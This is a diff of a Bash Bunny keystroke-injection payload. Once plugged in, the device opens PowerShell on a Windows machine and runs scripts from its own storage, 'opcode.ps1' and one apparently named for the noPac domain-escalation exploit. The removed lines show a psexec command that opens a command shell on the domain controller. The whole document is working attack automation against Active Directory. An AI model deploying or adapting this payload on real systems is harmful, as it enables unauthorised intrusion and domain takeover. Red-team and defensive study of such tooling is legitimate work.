@@ -28,7 +28,14 @@ Q DELAY 500
 Q STRING powershell 
 Q DELAY 500
 Q ENTER
-Q DELAY 500f
+Q DELAY 500
+Q STRING "cd ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\')"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING ".\opcode.ps1"
+Q DELAY 500
+Q ENTER
 Q STRING "cd ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\noPacRat\')"
 Q DELAY 500
 Q ENTER 
@@ -36,20 +43,4 @@ Q DELAY 500
 Q STRING ".\noPacRat.ps1"
 Q DELAY 500
 Q ENTER
-Q DELAY 1000
-Q STRING '$DC= Get-Content DC.txt' 
-Q DELAY 200
-Q ENTER
-Q DELAY 200
-Q STRING '$domain= (gwmi win32_computersystem).Domain' 
-Q DELAY 200
-Q ENTER
-Q STRING '$DCvar= "$DC.$domain"'
-Q DELAY 200
-Q ENTER
-Q DELAY 200
-Q STRING 'psexec.exe -accepteula \\"$DCvar" cmd'
-Q DELAY 500
-Q ENTER
-LED FINISH
-
+Q DELAY 38000
